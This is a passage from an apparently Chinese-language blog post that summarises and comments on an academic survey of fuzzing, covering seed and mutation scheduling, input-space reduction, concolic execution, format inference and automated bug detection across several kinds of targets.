中的一个基本块视作一个状态，状态转移即为基本块的执行迁移，fuzzer 通过在 fuzzing 过程中记录基本块的跳转频率来计算概率</p><blockquote><p>简而言之，马尔科夫链维护一个概率表（probability table），元素 <em>p<sub>ij</sub></em> 表示从状态 <em>i</em> 转移到状态 <em>j</em> 的概率</p><p><img src="https://s2.loli.net/2022/10/26/NFoAY1aEyUGvxVi.png" alt="image.png"></p></blockquote><p>有了基于马尔科夫链计算的 fitness，fuzzer 可以指导算力的分配，或是选择使用符号执行解决最困难的路径（最低的转移概率）；通常而言，转移概率越低，fitness 越好，因为能轻易到达的代码区域会比难以到达的区域更容易被充分探索</p><p>基于变异的模糊测试中通过对种子进行变异生成新的输入，每次输入运行了一条执行链，这提供了另一种基于马尔科夫链的视角：状态被定义为一个输入的一条执行路径，状态转移则为对输入 <em>t<sub>i</sub></em> 的变异，生成新的输入 <em>t<sub>j</sub></em> ，即由路径 <em>i</em> 迁移到路径  <em>j</em> ，fuzzer 在 fuzzing 过程中动态计算路径迁移的概率</p><blockquote><p>论文给出了这个例子：<a href="https://ieeexplore.ieee.org/abstract/document/8233151">AFLFast</a></p></blockquote><h3 id="3-2-3-Fitness-by-State-Transition（Multi-Armed-Bandit）"><em>3.2.3 Fitness by State Transition（Multi-Armed Bandit）</em></h3><p>马尔科夫链需要基于对所有状态已知来做出合适选择，但在 fuzzing 过程中并非所有状态都已被执行，因此马尔科夫链并非最优解</p><p>对于基本块转移，可以在数据统计中使用 <em>rule of three</em> （👴也不知道啥玩意，妹查到）；对于路径转移，可以使用轮询调度算法将时间预算平均分配给每个种子，然而这种方法无法决定什么时候从轮询调度切换到马尔科夫链——在遍历所有种子与关注特点种子间进行平衡，这便是一个经典的 <code>exploration vs. exploitation</code> 问题</p><p>一个更好的解决  <code>exploration vs. exploitation</code>  问题的方法便是使用 <strong>多臂老虎机</strong>（Multi-Armed Bandit，MAB，<s>又到了概率论学得稀烂的👴扣问号的时间</s>）表示路径转移：种子 <em>t<sub>i</sub></em> 被视作一条“臂”，“奖励”则是由种子 <em>t<sub>i</sub></em> 生成的一条新路径的发现</p><blockquote><p>论文给出了这个例子：<a href="https://www.usenix.org/conference/usenixsecurity20/presentation/yue">EcoFuzz</a></p></blockquote><h3 id="3-2-4-Fitness-by-State-Discovery"><em>3.2.4 Fitness by State Discovery</em></h3><p>马尔科夫链与多臂老虎机都能表示程序的状态迁移，然而模糊测试的基本目标是发现新的状态（新的代码覆盖率、新的漏洞、新的崩溃），由此模糊测试过程也可以表示为一个 <strong>物种发现问题</strong>（species discovery problem）： <em>生态学家从野外收集大量样本，样本中的物种可能丰富或稀少，生态学家以此推断集聚的性质，包括未发现的样本</em> ——类似地，<strong>由 fuzzer 生成的输入即为“已收集到的样本”，输入空间即为“集聚”（assemblage）</strong>，fuzzing 基于特定标准将输入进行分类</p><blockquote><p>例如一条执行路径可以是一个物种，执行这条路径的输入属于该物种，一个稀有物种即为较少输入执行到的路径，这引导着 fuzzer 去发现新的“物种”——新的路径→新的状态</p></blockquote><blockquote><p>论文给出了这个例子：<a href="https://mboehme.github.io/paper/FSE20.Entropy.pdf">Entropic</a></p></blockquote><h2 id="3-3-Byte-Schedule">3.3 Byte Schedule</h2><p><strong>字节调度</strong>（Byte Schedule）决定了 <em>选择种子中一个字节来变异</em> 的频率。大部分 fuzzer 基于执行信息来试探性地或随机地选择字节，这需要比 seed schedule 对程序行为有着更深刻的了解（例如路径约束或数据流），由此 fuzzer 可以关注于一个不那么复杂的问题——字节如何影响模糊测试的过程，称为字节的<strong>重要性</strong>（importance）</p><p>由于大部分灰盒 fuzzer 使用 <em>边覆盖率</em> 来测试 PUTs，第一种方法便是将重要性定义为 <em>字节如何影响分支行为</em></p><blockquote><p>论文给出了这些例子：<a href="https://arxiv.org/abs/1807.05620">NEUZZ</a>、<a href="https://arxiv.org/abs/2005.12392">MTFuzz</a></p></blockquote><p>另一种量化字节的重要性的方法是基于种子的 fitness 进行定义，在 fuzzing 过程中可以关注能提升 fitness 的字节：若对于一个字节的改变提升了种子的 fitness，则增加该种子的分数</p><blockquote><p>论文给出了这个例子：<a href="https://dl.acm.org/doi/10.1145/3460120.3484596">AFLChurn</a></p></blockquote><h2 id="3-4-Mutation-Operator-Schedule">3.4 Mutation Operator Schedule</h2><p>如 Fig2 所示，输入生成器的最后一步是选择一个变异器（mutation operator，即mutator）来对选择的字节进行变异，<strong>变异调度</strong>（mutation schedule）决定了下次变异所用的变异器</p><blockquote><p>论文给出了这些例子：</p><ul><li><a href="https://dl.acm.org/doi/10.1145/2908080.2908095">Classfuzz</a>：使用 <em>马尔科夫链蒙特卡洛方法</em> （Markov chain Monte Carlo） 建模变异调度</li><li><a href="">MOPT</a>：使用 <em>粒子群优化</em> （Particle swarm optimization）建模变异选择过程</li></ul></blockquote><h2 id="3-5-Diverse-Information-For-Fitness">3.5 Diverse Information For Fitness</h2><p>Fitness 除了调度种子、字节、变异器以外，还可以被用于指导种子存留：输入由种子变异而来，若一个输入探索到新的执行状态，其便被保留为新的种子，在种子调度中常选择新的种子；大部分的覆盖率指导的 fuzzer 基于边覆盖率来保留种子</p><p>为了提高发现漏洞的能力，需要更敏感的代码覆盖率带来更多的执行状态信息；另一方面，新类型的 fitness 也被为一些特殊场景设计了出来，例如深度学习模型或机器装置</p><p><img src="https://s2.loli.net/2022/10/26/PbVfo5HKp9e6aBy.png" alt="Fig. 3. Sensitivity and limitation of code coverage."></p><h3 id="3-5-1-Sensitive-Code-Coverage">3.5.1 Sensitive Code Coverage</h3><p>fitness 的敏感度标识区分执行状态的能力，大部分覆盖率指导的 fuzzer 使用一个位图来提供边覆盖率信息：</p><ul><li>位图中的每个元素下标表示一个边标识符（edge identifier），并为边标识符计算哈希值 <em>hash(b<sub>i</sub>, b<sub>j</sub>)</em> ，其中 <em>b<sub>i</sub></em> 与 <em>b<sub>j</sub></em> 为随机指派的基本块标识符（block identifier）</li></ul><p>尽管这种方法执行得很快，但其舍弃了对边覆盖率的预测，同时这种维护边覆盖率的实现导致了<strong>边碰撞</strong>（edge collision）问题（例如两条不同的边被分配了同一个标识符），为了分配唯一的边标识符，fuzzer 需要小心地分配块标识符且提供更精确的哈希函数</p><blockquote><p>如 Fig3.a 所示，若 <em>id<sub>AB</sub></em> == <em>id<sub>AC</sub></em> 且  <em>id<sub>BD</sub></em> == <em>id<sub>CD</sub></em> ，则路径 <code>ABD</code> 与 <code>ACD</code> 被当作同一条路径，在这种设想下 fuzzer 无法获得新的覆盖率，其会<strong>忽略</strong>漏洞路径 <code>ACDEG</code></p></blockquote><p>Fuzzer 通过位图便能确定一个输入是否产生了新的边；特别地，fuzzer 维护一个总体位图（overall bitmap，独立执行位图（bitmap of individual execution）的集合），在确定新的边时，fuzzer 将独立位图与总体位图对比，以检查这条新的边是否存在于独立位图中，然而位图集合丧失了执行信息</p><blockquote><p>例如若 Fig3.a 中的路径 <code>ABDEG</code> 与 <code>ACDFG</code> 已经被训练，则新的边 <code>ACDEG</code> 将不会被作为新的种子保留，因为在总体位图中早已存在所有的边</p></blockquote><p>一个解决方案是研究独立位图的融合，但由于融合位图会带来太多的种子，这需要在 fuzzing 效率与敏感覆盖率间平衡，一个潜在的解决方案是使用<strong>动态主成分分析</strong>（dynamic principle component analysis）来减少数据集的维度，其他的解决方案则是为边覆盖率提供额外信息，包括：边哈希（edge hash）、调用上下文（calling context）、多级覆盖率（multilevel coverage）、代码复杂度（code complexity）</p><p>对位图的改进关注于搜寻更多的代码覆盖，然而这样的改进可能没法探索复杂的执行状态，因此一个有效的解决方案便是通过<strong>人为监督</strong>（human-in-the-loop）来指导对复杂执行状态的探索</p><blockquote><p>例如 Fig3.b 为一段迷宫代码，<code>(a,b)</code> 代表在迷宫中的位置，为了触发 <code>bug()</code>，<code>(a,b)</code> 应当有着特定的值，然而 <code>switch</code> 仅有四条边，可以被快速遍历，在这之后 fuzzing 便失去了对到达漏洞位置的指引；此时分析者可以让模糊测试过程探索 <code>(a,b)</code> 的不同值</p></blockquote><p>此外，比较条件的值比二进制结果更加敏感，即 <code>examined</code> 或 <code>not examined</code></p><blockquote><p>例如 Fig3.a 中若 <code>(x[3] - 0x44)</code> 的值是可知的，则 fuzzer 便能选择更能满足条件 <code>if (x[3] == 0x44)</code> 的种子</p></blockquote><h3 id="3-5-2-Diverse-Fitness">3.5.2 Diverse Fitness</h3><p>由于模糊测试可用来检测多种应有的缺陷，而代码覆盖对于模糊测试而言并非一直都是最好的反馈，因此多种类型的 fitness 被针对特定的应用程序或缺陷设计了出来：</p><ul><li><p><em>Legality of execution result</em> ：一门 OOP 语言（比如 Java）由一个方法调用序列组成，非法的执行结果会抛出异常；在模糊测试过程中会生成并维护能探索更多新的及合法的目标状态的新的调用序列</p></li><li><p><em>State Machine of protocol implementations</em> ：由于协议的复杂性，fuzzer 通常通过搭积木的方式来推断出状态机：以一组种子起始变异以获取新的状态，基于状态机分析漏洞点并搜寻可能存在漏洞的状态转移</p></li><li><p><em>Safety policy of robotic vehicles</em> ：机器装置的物理/功能安全需要  <em>安全策略</em> （safety policy，例如机器的温度限制），因此可以保留接近违反安全策略的输入作为种子进行变异</p></li><li><p><em>Fitness for deep learning system</em> ：对深度学习系统（Deep Learning Systems，DLSs）的模糊测试设计了几种不同的 fitness</p></li></ul><blockquote><p>例如神经元覆盖率以发现极端场景（corner cases），损失函数以增强训练数据，操作符层（operator-level）覆盖率以探索深度学习推理机（inference engines）</p></blockquote><ul><li><p><em>Validation log for Android SmartTVs</em> ： validation log 可以被用来推断合法的输入以及获取输入边界，这为 fuzzer 提供了高效的种子且缩小了输入空间</p></li><li><p><em>Behavioral asymmetry of testing</em> ：在差异测试下（differential testing），可以通过在相同功能实现的相同输入上观测到不同行为来发现漏洞</p></li><li><p><em>Alias coverage for data race</em> ： alias coverage 通过跟踪一对可能交互的内存访问，以此发现由于缺乏合适的同步机制导致的条件竞争漏洞</p></li></ul><blockquote><p>文中提到的是内核文件系统中的条件竞争，由于两个线程访问一块共享内存时缺乏合适的同步机制导致，但笔者觉得条件竞争应该不局限于这样的情况（</p></blockquote><ul><li><em>Dangerous locations for bugs</em> ：危险区域是容易触发漏洞的区域，fuzzer 可以直接将资源集中在上边进行模糊测试以提高效率</li></ul><blockquote><p>例如对并发漏洞而言可以是会造成对原子性的违反、条件竞争等的代码区域，对于非并发漏洞而言可以通过补丁测试、崩溃复现、静态分析报告、信息流检测来获得，此外危险区域也可以是内存访问、sanitizer 检查或是 commit 记录</p></blockquote><h2 id="3-6-Evaluation-Theory">3.6 Evaluation Theory</h2><p>一个合适的<strong>评估</strong>（evaluation）可以在模糊测试过程中帮助其提高表现，包括有效实验语料库、公平的评估环境、合理的模糊测试时间、全面的对比指标</p><blockquote><p><strong>Gap 1</strong>：模糊测试理论缩小了输入空间与缺陷空间的差距，基于程序表现（如漏洞到达、状态转移、状态发现）规划模糊测试过程，大部分的理论规划了种子调度，几乎所有的 fuzzer 基于遗传算法规划种子存留</p></blockquote><h1>0x04. SEARCH SPACE OF INPUTS</h1><p>为了缩小输入空间、提升模糊测试的性能，fuzzers 将一个输入中的<strong>关联字节</strong>（related bytes，例如组成同一数据结构、影响同一路径约束、符合同一文法）分组并为每一组使用特定的变异器（包括字节变异与块变异）</p><blockquote><p>假设输入空间中有 <code>a* b</code> 字节，将其等分为 a 块，则相较于 <em>256<sup>a*b</sup></em> 而言，对于特定路径约束的搜索空间仅为 <em>a * 256<sup>b</sup></em></p></blockquote><p>在路径约束求解中，对关联字节的关注同样能缩小搜索空间，例如 Fig4.a 在第 13 行的约束满足的情况下第14行仅与一个字节相关联</p><p>一种特殊的输入是为如协议、编译器等进行高度结构化的输入，如 Fig4.b 中代码需要一个特殊起始格式的输入</p><p><img src="https://s2.loli.net/2022/10/27/PNphaetFqYm8jVJ.png" alt="Fig. 4. Search space of input. "></p><p>Table 2 中的 fuzzers 的主要贡献是缩小输入空间：</p><p><img src="https://s2.loli.net/2022/10/27/JweSDsxm8UZCTLk.png" alt="Table 2. Input space. Fuzzers reduce the input space by grouping the related bytes. The groups of bytes are obtained based on certain relation."></p><h2 id="4-1-Byte-constraint-Relation">4.1 Byte-constraint Relation</h2><p>大部分的路径约束仅被一小部分输入所影响，因此若 fuzzer 仅变异关联字节，则能通过缩小输入的搜索空间从而显著地提升性能</p><blockquote><p>例如我们需要变异一个字节数组 a[10] 需要生成 <em>256<sup>11</sup></em> 个输入，但若是我们知道仅有 a[2] 的值是有用的，则我们仅需要生成 256 个输入</p></blockquote><p>在获得字节约束关系后，可以随机地或从0~255 进行变异，但都比较低效；若在字节关系的推断过程中可以获得比较指令的值，fuzzer 可以在变异时选择通过路径约束的值</p><p>此外，模糊测试可以使用 <em>坡度下降算法</em> （gradient descent algorithm）来变异关联字节并逐渐解决路径约束</p><h3 id="4-1-1-Dynamic-Taint-Analysis">4.1.1 Dynamic Taint Analysis</h3><p><strong>动态污点分析</strong>（Dynamic Taint Analysis，DTA）是在构建输入与路径约束的关系中常用的一项技术，其通过<strong>在输入中进行标记后在运行中传播标签（label）并检查获取到标签的变量</strong>的方式来构建变量与数据的关联</p><p>fuzzer 可以使用 DTA 来构建输入与安全敏感点（security-sensitive points，例如条件跳转或系统调用）间的关系</p><h3 id="4-1-2-Relation-Inference">4.1.2 Relation Inference</h3><p>DTA 需要大量的人工且可能获得不准确的关系（due to implicit data flow）。由于 fuzzing 过程中需要大量执行测试用例，一种轻量的解决方案是在运行时推断字节关联，有两种具体方案：</p><ul><li>观测是否对一个字节的变异改变了变量的值，这意味着该字节可能与变量、比较指令或分支相关联</li><li>基于深度学习构建输入字节与分支行为间大概的关系</li></ul><h2 id="4-2-Concolic-Execution">4.2 Concolic Execution</h2><p><strong>混合执行</strong>（Concolic Execution，aka dynamic symbolic execution）将程序变量视作<strong>符号变量</strong>（symbolic variables），跟踪路径约束并使用约束求解器来为特定路径生成具体输入：通过求解路径约束来缩小输入空间</p><blockquote><p>关于什么是 concolic execution，可以看这张图（<s>如果你不知道符号执行那👴建议先别看了</s>）：</p><p><img src="https://s2.loli.net/2022/10/27/Fvl3yRNMnzKamfk.jpg" alt="concolic execution"></p></blockquote><p>同时使用符号执行与模糊测试的技术称之为<strong>混合模糊测试</strong>（hybrid fuzzing）或<strong>白盒模糊测试</strong>（whitebox fuzzing）：使用模糊测试来执行目标程序中的执行路径＋使用符号执行来求解执行路径中的约束</p><p>由于为每条执行路径都使用符号执行会非常耗时，因此当 fuzzing 无法获得更多状态时，混合执行被用以解决 fuzzing 无法满足的路径约束</p><p>混合模糊测试的一个改进便是为混合执行排序出最难的路径供其解决，也可以通过开发一个大概的约束求解器来提升，通常<strong>可满足性模理论</strong>（satisfiability modulo theory，STM）求解器（例如 z3 或 MathSAT5）被用来求解路径约束，但存在复杂约束及路径爆炸的问题，为了缓解这个问题，约束求解器仅符号化被输入影响的路径</p><p>另一个改进便是让约束求解器使用灰盒模式，例如，其使用线性函数以接近约束行为，因为大部分的路径约束被发现都是趋向于是线性的或单调的</p><p>研究人员也开始使用模糊测试来求解路径约束，例如 <a href="https://dl.acm.org/doi/10.1145/3338906.3338921">JFS</a> 将 SMT 公式翻译为程序并使用覆盖率指导的模糊测试来探索程序，模糊测试生成的输入到达特定区域或相应的程序时意味着解出了 SMT 公式</p><p>约束求解器也可以基于目标的特性进行改进，<a href="https://ieeexplore.ieee.org/document/9152662">Pangolin</a> 使用多面路径抽象（polyhedral path abstraction）来解决嵌套路径约束（nested path constraints），这种方法会保留历史约束的解答空间（solution space）并重用解答空间以满足当前路径约束的可达性</p><blockquote><p>例如对于 Fig4.a 中的第14行的约束，输入首先要满足第13行的约束</p></blockquote><p>为了在需要高度结构化的输入的程序中使用混合模糊测试，<a href="https://dl.acm.org/doi/10.1145/1375581.1375607">Godefroid</a> 将文法中的词素（token）符号化为符号变量，并使用上下文无关的约束求解器（context-free constraint solver）来生成新的输入</p><h2 id="4-3-Program-Transformation">4.3 Program Transformation</h2><p>对模糊测试而言，<strong>程序转换</strong>（program transformation）的目的是移除防止模糊测试发现更多执行状态的完整性检查，通过移除这些检查，模糊测试可以探索到目标程序更深处的代码并暴露出潜在的漏洞，但这也会引入一些误报（false positives），可以通过符号执行进行验证</p><p>因此 program transformation 通过聚焦于可能触发漏洞的输入来缩小搜索空间</p><h2 id="4-4-Input-Model">4.4 Input Model</h2><p>许多应用程序都需要高度结构化的输入，例如协议实现、系统调用等，<strong>输入模型</strong>（input model）指定了构造高度结构化输入的规则，包括结构体、格式、输入的数据约束，即违反语法或语义的输入会在一开始就被拒绝，由此<strong>输入空间便被限制于输入模型</strong></p><h3 id="4-4-1-Accessible-Models-or-Tools">4.4.1 Accessible Models or Tools</h3><p>基于空白规范（bare specifications）的输入生成需要繁重的工程工作，复杂规范的解析也非常容易出错，因此研究社区为一些高度结构化的输入开源了一些工具</p><blockquote><p>例如 <a href="https://dl.acm.org/doi/10.1145/357766.351266">QuickCheck</a> 和 <a href="https://www.antlr.org/">ANTLR</a>，例如 <a href="https://www.ndss-symposium.org/ndss-paper/nautilus-fishing-for-deep-bugs-with-grammars/">NAUTILUS</a> 与 <a href="https://www.researchgate.net/publication/335427315_Superion_Grammar-Aware_Greybox_Fuzzing">Superion</a> 便基于 ANTLR 生成输入</p></blockquote><p>在一些场景下输入模型也可以是输入的类型（例如 API 参数或物理信号）</p><h3 id="4-4-2-Integration-of-Implementations">4.4.2 Integration of Implementations</h3><p>另一个前景较好的方案是将模糊测试与目标应用进行集成，这样的集成允许模糊测试通过客制化输入生成过程来测试预期性能</p><blockquote><p>例如 <a href="https://dl.acm.org/doi/10.1145/2976749.2978411">TLS-Attacker</a> 创造了能基于每个段的类型变异输入的框架，并能改变协议消息的顺序</p></blockquote><h3 id="4-4-3-Intermediate-Representation">4.4.3 Intermediate Representation</h3><p>另一个复杂的方案是将输入模型转化为一种<strong>中间表示</strong>（Intermediate Representation）：</p><ul><li>将原始输入文件翻译为更简单且更统一的 IR，fuzzer 基于 IR 进行变异后再翻译回原始输入格式</li></ul><p>这种变异策略能在保持了语法与语义的正确性的同时生成了多种输入</p><h2 id="4-5-Fragment-Recombination">4.5 Fragment Recombination</h2><p>另一种生成输入的方式是通过<strong>碎片重整合</strong>（fragment recombination）：将输入文件分成许多的小块（fragments），通过从不同文件中整合碎片来生成新的输入，同时每个碎片应符合规范以确保语法正确性</p><p><img src="https://s2.loli.net/2022/10/28/GqE5UckCFQie96L.png" alt="Fig. 5. Fragment Recombination."></p><p>如 Fig.5 所示，fuzzer 首先将输入文件解析成一棵保持语法正确性的树（例如 AST），这需要一个有效的输入语料库来解析输入，同时 fuzzer 还需要为语料库收集此前造成错误行为的有问题的输入</p><p>在此前曾经发现漏洞的区域或附近仍有可能存在新的漏洞，而有问题的输入已执行了能造成错误行为的复杂路径，因此碎片重整合可能会执行同样或相似的路径，这有利于探索更深的代码</p><p>在第二阶段输入被碎片化后会存放到碎片池中，由于输入被解析成 AST，fuzzer 可以使用非终止节点（non-terminals）来组成新的子树，在重整合碎片时基于 随机/遗传算法/机器学习 来选用语法兼容的（syntactically compatible）碎片，此外语义正确性也对模糊测试的效率有重要影响</p><blockquote><p>例如 <a href="https://www.ndss-symposium.org/ndss-paper/codealchemist-semantics-aware-code-generation-to-find-vulnerabilities-in-javascript-engines/">CodeAlchemist</a> 使用汇编约束标记碎片，仅在碎片满足约束时才进行整合</p></blockquote><h2 id="4-6-Format-Inference">4.6 Format Inference</h2><p>若输入模型不可用，推断输入格式也是前景较好的解决方案，且一个输入模型仅能生成一种特定格式的输入，因此<strong>格式推断</strong>（format inference）比基于模型的方案更加灵活</p><h3 id="4-6-1-Corpus-based">4.6.1 Corpus-based</h3><p>一种直接的方案是从有效输入语料库进行推断。由于缺乏输入模型，研究者建立了端到端（end-to-end）的机器学习模型作为替代，<strong>循环神经网络</strong>（recurrent neural network，RNN）这一模型更合适生成结构化输入，但这一替代方案有可能受到生成非法输入的影响，因此训练数据需要相应的改进</p><blockquote><p>例如 <a href="https://faculty.ist.psu.edu/wu/papers/DeepFuzz.pdf">DeepFuzz</a> 生成语法有效输入的比例仅为 82.63%</p></blockquote><p>模糊测试也可以基于有效输入语料库合成一种上下文无关语法来生成高度结构化的输入</p><h3 id="4-6-2-Coverage-based">4.6.2 Coverage-based</h3><p>基于语料库的解决方案需要对输入规则的综合覆盖，可能会不实际，此外其并没有使用内部执行状态的信息，这可能会造成较低的代码覆盖率</p><p>输入的格式指示了输入中不同字节的关系，因此基于代码覆盖，fuzzer 可以推断字节到字节的（byte-to-byte）关系来启动模糊测试</p><blockquote><p>例如 <a href="https://www.usenix.org/conference/usenixsecurity19/presentation/blazytko">GRIMOIRE</a> 使用代码覆盖来推断目标程序所需的输入格式</p></blockquote><h3 id="4-6-3-Encoding-Function">4.6.3 Encoding Function</h3><p>与上述关注于输入的方法不同，有的 fuzzer 搜索会编码输入格式的代码区域，因为这类代码与生成结构良好的（well-structured）输入相关，故 fuzzer 在编码格式前进行变异</p><p>尽管 PUTs 的源码可能没法获取，但他们所生成的结构良好的输入则不然，例如有的社区会开源一些生成高度结构化输入的工具</p><p>对 IOT 设备而言，大部分都通过配套程序来控制，因此通过定位与编码格式相关的代码，变异可以在函数的参数或是计算格式的指令上完成</p><blockquote><p>例如 <a href="https://www.ndss-symposium.org/wp-content/uploads/2018/03/NDSS2018_01A-1_Chen_Slides.pdf">IOTFuzzer</a> 便 hook 了这类函数并对其参数进行变异</p></blockquote><h2 id="4-7-Dependency-Inference">4.7 Dependency Inference</h2><p>格式推断主要解决语法需求，这仍可能生成有着错误数据依赖项的输入，例如在 Fig.6 中的 <code>snippet2</code> 中，在 <code>2-5</code> 出现了一个由于 <code>errf()</code> 未定义导致的错误</p><p><img src="https://s2.loli.net/2022/10/28/pZnh2GsWyLJ4d1g.png" alt="Fig. 6 Semantic error (JavaScript). "></p><p>许多应用都需要在输入中有着正确的<strong>数据依赖项</strong>（data dependency），通常由一系列语句（statement）组成，包括系统调用、对象、APIs、ABIs等</p><h3 id="4-7-1-Documents-or-Source-Code">4.7.1 Documents or Source Code</h3><p>序列的数据依赖项通常通过静态分析来推断，因为许多应用都有相应的文档或源码，可以据此推断数据依赖项，并在模糊测试过程中在生成输入前先生成其先决项（prerequisites）</p><p>但静态分析误报率高且会错过接口的依赖项，因此一个较好的解决方案是结合静态分析与动态分析</p><h3 id="4-7-2-Real-world-Programs">4.7.2 Real-world Programs</h3><p>真实世界的许多程序通过命令行来调用接口，这便包含了数据依赖项，fuzzing 可以基于这些真实世界中程序的切片程序（program slicing）生成调用接口的新程序</p><p>数据依赖项也可以通过分析执行日志（execution log）来推断，日志中明确包含接口的顺序信息（例如哪个接口先被执行），同时隐含了接口间的参数依赖项信息</p><p>为了获得这些直接与间接的信息，模糊测试在执行过程中 hook 每个接口并记录自己所需的数据</p><blockquote><p><strong>Gap 2</strong>：输入空间的减小依赖于对语法/语义关联的输入字节的分组，分组的优点是在探索更多执行状态中提升效率，由此 fuzzing 更倾向于满足路径约束以探索被这些约束守护的更深的代码区域</p></blockquote><h1>0x05. AUTOMATION</h1><p><strong>自动执行</strong>（Automatic execution）是模糊测试理论与输入空间减方法的基础，而成功的模糊测试需要：</p><ul><li><strong>自动重复地运行 PUTs</strong>。大部分 fuzzer 都能测试命令行程序，但对于硬件或多语言软件而言不行</li><li><strong>对潜在漏洞的自动指示器</strong>（automatic indicator）。当前 fuzzer 使用 crashes 作为潜在漏洞的标志，但如条件竞争一类的漏洞并不会触发 crash</li><li><strong>高速执行</strong>。在相同的时间内检验更多的测试用例，以此增加发现漏洞的机会</li></ul><h2 id="5-1-Automatic-Execution-of-PUTs">5.1 Automatic Execution of PUTs</h2><p>对不同应用程序的自动化模糊测试需要不同的工程努力，本节介绍几种自动化模糊测试的方法</p><h3 id="5-1-1-Command-line-Programs">5.1.1 Command-line Programs</h3><p>模糊测试在测试命令行程序时通过子进程运行 PUTs 并将所需选项（options）与输入喂给程序，同时在执行 PUT 时其并不会重复所有的步骤，而是克隆出子进程以略过预处理步骤</p><p><em>在整个模糊测试过程中通常仅用一个命令行选项（即所有输入都基于该选项执行），因为不同的选项代表了不同的代码覆盖，而一次全面的测试需要列举所有的选项，因此一个高效的方案便是若对于一个选项而言当前输入无效，则跳过剩余的所有选项</em></p><blockquote><p>这里论文原文说“该种方案的一个重要的观测是若一个输入对一个选项而言是无效的，则其也会对其他选项无效”，但笔者觉得这个说法有失偏颇（</p></blockquote><h3 id="5-1-2-Deep-Learning-Systems">5.1.2 Deep Learning Systems</h3><p>测试深度学习系统（DLS）的过程类似于测试命令行，通过生成输入（可以是训练数据、测试数据或不同目标上的深度学习模型）测试 DLSs 以获得更好的 fitness（可以是神经元覆盖率、损失函数、运算符级覆盖率），同时除了检测缺陷以外也会检查模型的健壮性</p><h3 id="5-1-3-Operating-System-Kernels">5.1.3 Operating System Kernels</h3><p>OS kernel 包含了许多中断与内核线程，其执行状态无法确定，由此我们使用 hypervisor（如 QEMU）来运行内核，并通过 <a href="https://zhangtong16.github.io/2019/06/05/Intel-Processor-Trace/">Intel’s Processor Trace</a> （PT）技术来获取代码覆盖；尽管这种方法能带反馈地测试不同种内核，但仍需要人工构造语法&amp;语义正确的输入</p><p>因为输入包括文件系统镜像或一系列系统调用，fuzzers 可以以更轻量级的方法进行测试：在系统调用的数据依赖项被分析/推断出来后生成一系列系统调用并在目标内核上运行，并监测代表潜在漏洞的 system panics</p><p>另一种测试方法是通过模拟外设并生成相应输入来测试内核驱动</p><h3 id="5-1-4-Cyber-Physical-Systems">5.1.4 Cyber-Physical Systems</h3><p><strong>信息物理系统</strong>（Cyber-Physical Systems，CPS）包含两个紧密结合的主要成分，即<strong>计算元素</strong>（computational elements）与<strong>物理过程</strong>（physical processes）</p><p>一个被广泛使用的计算元素是 <em>可编程逻辑控制器</em> （programmable logic controller，PLC），其控制着物理过程的驱动器并从传感器中获取输入，因此在 fuzzing CPSs 时 fuzzer 可以替换掉 PLCs 并通过网络直接向驱动器发送大量的命令</p><p>PLC 的二进制文件也是 CPSs 的一个可测试点，但其有着多种二进制格式以及复杂的与物理实体间的通信；基于对 PLC 二进制文件与开发平台的分析，自动化的 fuzz 可以在其运行在 PLC 设备上时进行</p><h3 id="5-1-5-Internet-of-Things">5.1.5 Internet of Things</h3><p>IOT 的自动化 fuzzing 包括模拟与网络级测试：</p><ul><li>模拟器可以在没有对应硬件时运行 IOT 固件，以灰盒模式测试目标程序</li><li>网络级的 fuzzing 以黑盒模式进行测试，即通过网络向 IOT 设备发送信息，以响应作为执行结果，fitness 便是类型数量</li></ul><h3 id="5-1-6-Applications-with-Graphical-User-Interface">5.1.6 Applications with Graphical User Interface</h3><p>GUI 程序的执行比命令行慢得多，而执行速度是 fuzzing 的关键，因此对 GUI 程序的自动化测试通常将 GUI 替换为一种更快的方案并以命令行模式执行目标</p><blockquote><p>例如对 UI 操作建模后为安卓应用生成事件序列（event sequences）</p></blockquote><p>此外，fuzzer 也可以使用 <strong>hardness</strong> 来准备执行上下文，以直接唤醒 GUIs 中的目标函数</p><h3 id="5-1-7-Applications-with-Network">5.1.7 Applications with Network</h3><p>智能合约、协议实现、云服务、Android Native System Services、机器人装置等通过网络接收输入，由此可以在本地生成输入后由目标应用远程执行，自动测试的效率依赖于生成输入的质量与反映执行状态的 fitness</p><h2 id="5-2-Automatic-Detection-of-Bugs">5.2 Automatic Detection of Bugs</h2><p>对于漏洞检测器（detector）而言漏洞的代码区域不可知，甚至不知道程序中是否存在漏洞，因此在自动 fuzzing 中记录潜在漏洞就变得十分重要，漏洞的标志（indicator）通常是程序执行时崩溃，也有一些基于漏洞模式（pattern）设计的专一而高效的指示器</p><p>本节主要介绍成功由 fuzzing 发现的六种漏洞：内存损坏、并发漏洞、算法复杂性、spectre 型漏洞、测信道、整型漏洞</p><h3 id="5-2-1-Memory-violation-Bugs">5.2.1 Memory-violation Bugs</h3><blockquote><p>这段对于打 Pwn 的同学来说都比较无聊，笔者就不细录了</p></blockquote><p><strong>内存损坏型漏洞</strong>（Memory-violation Bugs）是最古老也最严重的安全漏洞，分为两类：</p><ul><li><strong>空间安全损坏</strong>（spatial safety violation）：即非法内存访问。如 Fig.7a 便是一个越界（out-of-bound）内存访问</li><li><strong>时间安全损坏</strong>（temporal safety violation）：即非法内存引用。如 Fig.7b 便是一个 use-after-free 漏洞</li></ul><p><img src="https://s2.loli.net/2022/10/30/nAuTKjBHO2JpeXE.png" alt="Fig. 7. Memory violation bugs"></p><p>尽管已经有一些针对内存破坏型漏洞的缓解措施（migration），但由于开销、兼容性、健壮性等原因，大部分缓解措施并未实际被使用</p><blockquote><p>例如 CTF 里打 kernel pwn 通常都要 bypass KPTI，但在真实世界的高性能场景下这一特性通常是被关闭的</p><blockquote><p>（听说在实际应用中有20%以上的性能损耗，<s>👴也不知道是不是真的</s></p></blockquote></blockquote><blockquote><p>论文给出了两个例子：</p><ul><li><a href="https://www.usenix.org/conference/usenixsecurity13/technical-sessions/papers/haller">Dowser</a> ：认为缓冲区溢出主要发生于循环中对数组的访问，通过排序循环中内存访问指令并给更高排序的输入高优先级后利用污点分析与混合执行求解选中输入的路径约束以检测 OOB 漏洞</li><li><a href="https://dl.acm.org/doi/10.1145/3377811.3380386">UAFL</a>：由于 UAF 漏洞通常是分配→释放→重用三步走，这一漏洞模式驱动 UAFL 生成能够逐渐覆盖一整列潜在 UAF 漏洞的输入，潜在 UAF 序列通过基于漏洞模式的静态类型分析完成</li></ul></blockquote><h3 id="5-2-2-Concurrency-Bugs">5.2.2 Concurrency Bugs</h3><p><strong>并发型漏洞</strong>（Concurrency 